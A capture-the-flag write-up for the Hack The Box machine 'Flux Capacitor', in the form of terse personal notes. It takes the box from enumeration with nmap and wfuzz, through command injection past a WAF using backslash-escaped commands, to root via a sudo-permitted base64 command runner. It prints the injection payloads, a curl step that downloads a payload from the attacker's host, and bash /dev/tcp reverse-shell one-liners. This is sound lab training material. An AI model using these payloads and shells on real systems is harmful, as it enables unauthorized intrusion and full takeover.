# HTB - Flux Capacitor  10.10.10.69




- Ubuntu 17.10 
- Linux fluxcapacitor 4.13.0-17-generic #20-Ubuntu SMP Mon Nov 6 10:04:08 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


- Read source, to get /sync url
- Fuzz /sync and discover ?opt=cmd
- Discover how to escape Waf : /sync?opt=' \l\s -al'
- Upload reverse shell : curl "http://10.10.10.69/sync?opt='? c\u\rl 10.10.14.32:8000 -o /tmp/a'"
- Run reverse shell : curl "http://10.10.10.69/sync?opt='? b\a\s\h /tmp/a '"
- Get reverse shell as nobody

- sudo -l to get root



## Walkthrough

- https://dastinia.io/write-up/hackthebox/2018/05/13/hackthebox-fluxcapacitor-writeup/


## nmap
```
# Nmap 7.70 scan initiated Sun Sep 15 00:16:15 2019 as: nmap -o enum/nmap_fluxcapacitor.htb.txt fluxcapacitor.htb
Nmap scan report for fluxcapacitor.htb (10.10.10.69)
Host is up (0.031s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
```



## 80: http://fluxcapacitor.htb

![](images/http:__fluxcapacitor.htb:80.png)
```
OK: node1 alive FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb
Roads? Where we're going, we don't need roads.
```

In sources
```
<!--
		Please, add timestamp with something like:
		<script> $.ajax({ type: "GET", url: '/sync' }); </script>
-->
```

## 80: http://fluxcapacitor.htb/sync

HTTP page
```
403 Forbidden
openresty/1.13.6.1
```

But content is a timestamp
```
# curl  http://10.10.10.69/sync
20190915T00:24:27

# curl  http://10.10.10.69/sync
20190915T00:24:42
```


## https://github.com/openresty/openresty

OpenResty - Turning Nginx into a Full-Fledged Scriptable Web Platform


## Fuzz /sync

wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt


```
# wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.69/sync?FUZZ=echo

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.69/sync?FUZZ=echo
Total requests: 220560

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000058:  C=200      2 L	       1 W	     19 Ch	  "article"
000059:  C=200      2 L	       1 W	     19 Ch	  "04"
000060:  C=200      2 L	       1 W	     19 Ch	  "03"
000061:  C=200      2 L	       1 W	     19 Ch	  "help"
000062:  C=200      2 L	       1 W	     19 Ch	  "events"
000063:  C=200      2 L	       1 W	     19 Ch	  "archive"
...
```
Almost all 200 are with 19 lenght
Remove the 19 length
```
# wfuzz -z file,./burp-parameter-names.txt --hh=19 http://10.10.10.69/sync?FUZZ=echo

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.69/sync?FUZZ=echo
Total requests: 2588

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000753:  C=403      7 L	      10 W	    175 Ch	  "opt"

Total time: 16.21017
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 159.6528
```

With opt parameter we have a 403 instead of 200.

```
root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# curl http://fluxcapacitor.htb/sync?opt=a
20190915T00:33:56



root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# curl http://fluxcapacitor.htb/sync?opt=echo
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty/1.13.6.1</center>
</body>
</html>

root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# curl http://fluxcapacitor.htb/sync?opt=ech
20190915T00:34:20

root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# curl http://fluxcapacitor.htb/sync?opt=ls
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty/1.13.6.1</center>
</body>
</html>

root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# curl http://fluxcapacitor.htb/sync?opt=dir
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty/1.13.6.1</center>
</body>
</html>

```


## Runing command

```
# curl "http://10.10.10.69/sync?opt=' ls -al /'"
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty/1.13.6.1</center>
</body>
</html>
```
Une commande bash est reconnue par le waf

Il faut mettre des ' est un espace...
Faut trouver...

```
# curl "http://10.10.10.69/sync?opt= whoami"
20190915T00:48:15

root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# curl "http://10.10.10.69/sync?opt=' whoami'"
nobody
bash: -c: option requires an argument

```

Escape it
```
root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# curl "http://10.10.10.69/sync?opt=' l\s -al /'"
total 483896
drwxr-xr-x  22 root root      4096 Dec  8  2017 .
drwxr-xr-x  22 root root      4096 Dec  8  2017 ..
drwxr-xr-x   2 root root      4096 Dec  2  2017 bin
drwxr-xr-x   3 root root      4096 Dec  8  2017 boot
drwxr-xr-x  18 root root      3880 Sep 15 00:05 dev
drwxr-xr-x  77 root root      4096 Dec  8  2017 etc
drwxr-xr-x   4 root root      4096 Dec  5  2017 home
lrwxrwxrwx   1 root root        33 Dec  8  2017 initrd.img -> boot/initrd.img-4.13.0-19-generic
lrwxrwxrwx   1 root root        33 Dec  8  2017 initrd.img.old -> boot/initrd.img-4.13.0-19-generic
drwxr-xr-x  20 root root      4096 Dec  4  2017 lib
drwxr-xr-x   2 root root      4096 Dec  2  2017 lib64
drwx------   2 root root     16384 Dec  2  2017 lost+found
drwxr-xr-x   2 root root      4096 Dec  2  2017 media
drwxr-xr-x   2 root root      4096 Dec  2  2017 mnt
drwxr-xr-x   5 root root      4096 Dec  2  2017 opt
dr-xr-xr-x 135 root root         0 Sep 15 00:05 proc
drwx------   3 root root      4096 Dec 24  2017 root
drwxr-xr-x  19 root root       520 Sep 15 00:05 run
drwxr-xr-x   2 root root      4096 Dec  8  2017 sbin
drwxr-xr-x   2 root root      4096 Dec  2  2017 srv
-rw-------   1 root root 495416320 Dec  2  2017 swapfile
dr-xr-xr-x  13 root root         0 Sep 15 00:45 sys
drwxrwxrwt  10 root root      4096 Sep 15 00:35 tmp
drwxr-xr-x  10 root root      4096 Dec  2  2017 usr
drwxr-xr-x  11 root root      4096 Dec  2  2017 var
lrwxrwxrwx   1 root root        30 Dec  8  2017 vmlinuz -> boot/vmlinuz-4.13.0-19-generic
lrwxrwxrwx   1 root root        30 Dec  2  2017 vmlinuz.old -> boot/vmlinuz-4.13.0-17-generic
bash: -c: option requires an argument

root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# 
```

## Reverse shell

Create index.htm
```
bash -i >& /dev/tcp/10.10.14.32/4444 0>&1
```
Serve it with Python
Upload it
```
# curl "http://10.10.10.69/sync?opt='? c\u\rl 10.10.14.32:8000 -o /tmp/a'"
bash: -c: option requires an argument
```
Run it
```
root@kali:~/htb/YoloToolbox/machines/htb/fluxcapacitor# curl "http://10.10.10.69/sync?opt='? b\a\s\h /tmp/a '"
```
Get shell on nc
```
r# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.32] from fluxcapacitor.htb [10.10.10.69] 34538
bash: cannot set terminal process group (596): Inappropriate ioctl for device
bash: no job control in this shell
nobody@fluxcapacitor:/$ id
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
nobody@fluxcapacitor:/$ 


```

## System

```
$ cat /etc/issue
cat /etc/issue
Ubuntu 17.10 \n \l

nobody@fluxcapacitor:/$ uname -a
uname -a
Linux fluxcapacitor 4.13.0-17-generic #20-Ubuntu SMP Mon Nov 6 10:04:08 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

## User flag

```
ls -al /home/*/*.txt
ls -al /home/*/*.txt
-rw-r--r-- 1 root      root      33 Dec  5  2017 /home/FluxCapacitorInc/user.txt
-r--r--r-- 1 themiddle themiddle 46 Dec  5  2017 /home/themiddle/user.txt

cat /home/*/*.txt
cat /home/*/*.txt
XXXXXXXXXXXXXXXXXXXXXXXx
Flags? Where we're going we don't need flags.
```

## Escalation

```
$ sudo -l
sudo -l
Matching Defaults entries for nobody on fluxcapacitor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nobody may run the following commands on fluxcapacitor:
    (ALL) ALL
    (root) NOPASSWD: /home/themiddle/.monit
nobody@fluxcapacitor:/home$ vi /home/themiddle/.monit
```
```
$ cat /home/themiddle/.monit
cat /home/themiddle/.monit
#!/bin/bash

if [ "$1" == "cmd" ]; then
	echo "Trying to execute ${2}"
	CMD=$(echo -n ${2} | base64 -d)
	bash -c "$CMD"
fi
```

Get bash as root
```
$ echo "/bin/bash" | base64
L2Jpbi9iYXNoCg==

$ sudo /home/themiddle/.monit cmd L2Jpbi9iYXNoCg==
Trying to execute L2Jpbi9iYXNoCg==

id
uid=0(root) gid=0(root) groups=0(root)
```


Get remote nc as root
```
$ echo "bash -i >& /dev/tcp/10.10.14.32/4445 0>&1" >/tmp/b
$ echo "/tmp/b" | base64
L3RtcC9iCg==
$ sudo /home/themiddle/.monit cmd L3RtcC9iCg==

# nc -lvp 4445
listening on [any] 4445 ...
connect to [10.10.14.32] from fluxcapacitor.htb [10.10.10.69] 43500
bash: cannot set terminal process group (596): Inappropriate ioctl for device
bash: no job control in this shell
root@fluxcapacitor:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@fluxcapacitor:/# cat /root/root.txt
cat /root/root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXxxx

```

